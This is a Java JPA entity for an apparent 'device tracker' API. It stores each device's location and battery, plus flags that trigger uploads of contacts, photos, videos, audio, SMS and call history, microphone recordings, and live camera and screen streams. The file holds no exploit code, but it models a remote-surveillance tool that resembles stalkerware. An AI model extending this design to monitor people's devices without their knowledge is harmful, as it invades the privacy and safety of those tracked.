package com.manish.device_tracker_api.entity;

import jakarta.persistence.*;
import lombok.*;

import java.time.LocalDate;
import java.time.LocalDateTime;

@Table(name = "device_info")
@Data
@NoArgsConstructor
@AllArgsConstructor
@Entity
public class DeviceInfo {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false)
    private String username;

    @Column(nullable = false, unique = true)
    private String deviceId;

    @Column(nullable = false)
    private String deviceModel;

    @Column(nullable = false)
    private String appVersion;

    private Double latitude;

    private Double longitude;

    @Column(columnDefinition = "TEXT")
    private String address;

    private Integer battery;

    private LocalDateTime lastOnline;

    private Boolean trackingEnabled = false;

    private Integer trackingInterval = 60;

    // Contacts
    private Boolean contactsUploaded = false;
    private Boolean refreshContacts = false;

    // Images
    private Boolean imagesUploaded = false;
    private Boolean refreshImages = false;
    private String imageBucketId;
    private Integer imageLimit;
    private Integer imageOffset;
    private String imageOrder;

    // Videos
    private Boolean videosUploaded = false;
    private Boolean refreshVideos = false;
    private String videoBucketId;
    private Integer videoLimit;
    private Integer videoOffset;
    private String videoOrder;

    // Audio
    private Boolean audiosUploaded = false;
    private Boolean refreshAudios = false;
    private String audioBucketId;
    private Integer audioLimit;
    private Integer audioOffset;
    private String audioOrder;

    // Mic Recording
    private Boolean micUploaded = false;
    private Boolean refreshMic = false;
    private Integer micDuration;

    // Live Camera
    private Boolean refreshCamera;
    private Boolean cameraStreaming;
    private String cameraSessionId;
    private String cameraType;

    // Live Screen
    private Boolean refreshScreen = false;
    private Boolean screenStreaming = false;
    private String screenStatus = "IDLE";
    private String screenSessionId;
    private LocalDateTime screenStartedAt;
    private LocalDateTime screenStoppedAt;

    // Call History
    private Boolean refreshCallHistory = false;

    // Sms History
    @Column(name = "refresh_sms")
    private Boolean refreshSms = false;

    @Column(name = "sms_uploaded")
    private Boolean smsUploaded = false;

    @Column(name = "sms_from_date")
    private LocalDate smsFromDate;

    @Column(name = "sms_to_date")
    private LocalDate smsToDate;

    @Column(nullable = false)
    private LocalDateTime createdAt;

    @Column(nullable = false)
    private LocalDateTime updatedAt;

    @PrePersist
    public void prePersist() {
        this.createdAt = LocalDateTime.now();
        this.updatedAt = LocalDateTime.now();
    }

    @PreUpdate
    public void preUpdate() {
        this.updatedAt = LocalDateTime.now();
    }
}